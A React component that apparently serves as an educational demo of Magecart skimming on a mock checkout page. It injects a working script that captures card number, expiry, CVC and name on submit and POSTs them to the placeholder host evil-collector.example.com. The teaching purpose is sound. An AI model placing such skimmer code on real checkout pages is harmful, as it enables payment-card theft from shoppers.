import React, { useEffect } from "react";

const MagecartTest = () => {
  useEffect(() => {
    // Script malicioso simulado (solo para pruebas)
    const script = document.createElement("script");
    script.innerHTML = `
      // Simulación de Magecart
      document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('payment-form');
        if (form) {
          form.addEventListener('submit', function(e) {
            e.preventDefault();
            const formData = {};
            for (let el of this.elements) {
              if (el.name) formData[el.name] = el.value;
            }
            console.log('Datos capturados por Magecart:', formData);
            
            // Simular envío a servidor malicioso
            fetch('https://evil-collector.example.com/steal', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify(formData)
            }).catch(err => console.log('Exfiltración simulada:', formData));
          });
        }
      });
    `;
    document.head.appendChild(script);

    return () => {
      // Cleanup al desmontar componente
      const scripts = document.head.querySelectorAll("script");
      scripts.forEach((s) => {
        if (s.innerHTML.includes("Simulación de Magecart")) {
          s.remove();
        }
      });
    };
  }, []);

  return (
    <div
      style={{
        fontFamily: "Arial",
        padding: "20px",
        maxWidth: "600px",
        margin: "0 auto",
      }}
    >
      <h1>🛒 Magecart Test - Checkout Simulado</h1>
      <div
        style={{ background: "#f5f5f5", padding: "20px", borderRadius: "8px" }}
      >
        <h2>Complete Your Purchase</h2>
        <form
          id="payment-form"
          style={{ display: "flex", flexDirection: "column", gap: "15px" }}
        >
          <div>
            <label>Card Number:</label>
            <input
              name="cc_number"
              placeholder="1234 5678 9012 3456"
              style={{
                width: "100%",
                padding: "10px",
                border: "1px solid #ddd",
                borderRadius: "4px",
              }}
            />
          </div>

          <div style={{ display: "flex", gap: "15px" }}>
            <div style={{ flex: 1 }}>
              <label>Expiry:</label>
              <input
                name="cc_exp"
                placeholder="MM/YY"
                style={{
                  width: "100%",
                  padding: "10px",
                  border: "1px solid #ddd",
                  borderRadius: "4px",
                }}
              />
            </div>
            <div style={{ flex: 1 }}>
              <label>CVC:</label>
              <input
                name="cc_cvc"
                placeholder="123"
                style={{
                  width: "100%",
                  padding: "10px",
                  border: "1px solid #ddd",
                  borderRadius: "4px",
                }}
              />
            </div>
          </div>

          <div>
            <label>Cardholder Name:</label>
            <input
              name="cc_name"
              placeholder="John Doe"
              style={{
                width: "100%",
                padding: "10px",
                border: "1px solid #ddd",
                borderRadius: "4px",
              }}
            />
          </div>

          <button
            type="submit"
            style={{
              background: "#007bff",
              color: "white",
              padding: "15px",
              border: "none",
              borderRadius: "4px",
              fontSize: "16px",
              cursor: "pointer",
            }}
          >
            Pay Now - $299.99
          </button>
        </form>

        <div
          style={{
            marginTop: "20px",
            padding: "10px",
            background: "#fff3cd",
            borderRadius: "4px",
          }}
        >
          <strong>⚠️ Advertencia:</strong> Esta es una simulación educativa.
          Abre las herramientas de desarrollador para ver cómo Magecart captura
          los datos.
        </div>
      </div>
    </div>
  );
};

export default MagecartTest;
